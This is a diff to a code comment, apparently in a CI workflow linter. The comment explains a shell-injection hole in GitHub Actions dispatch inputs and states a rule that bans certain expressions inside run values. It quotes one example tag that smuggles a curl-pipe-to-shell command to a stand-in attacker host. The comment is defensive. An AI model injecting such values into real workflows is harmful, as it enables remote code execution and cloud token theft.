@@ -6,9 +6,11 @@
 //     run: az acr build -t "doc-indexer:${{ github.event.inputs.tag }}" .
 //
 // a tag of  x"; curl https://attacker.example | sh; echo "  is not data, it is a command. Four Azure-era
-// workflows did exactly this, in jobs that held `id-token: write`, so anyone able to dispatch a workflow (11
-// agent lanes can) had a path to a job that can ask GitHub for a cloud token. actionlint does not catch it: it
-// treats dispatch inputs as trusted and only flags a short list of known untrusted event fields.
+// workflows did exactly this, in jobs that held `id-token: write`, and anyone able to dispatch a workflow (11
+// agent lanes can) could supply the input. One of them (deploy-eval-gate) let its Azure login fail and carried
+// on, so the injected line really ran; the other three were protected only by that login failing. actionlint
+// does not catch it: it treats dispatch inputs as trusted and only flags a short list of known untrusted event
+// fields.
 //
 // THE RULE. Inside a `run:` (or `script:` / `inlineScript:`) value, no expression may read `inputs.*`,
 // `github.event.*` (this includes `github.event.inputs.*`) or `github.head_ref` / `base_ref` / `ref_name`.
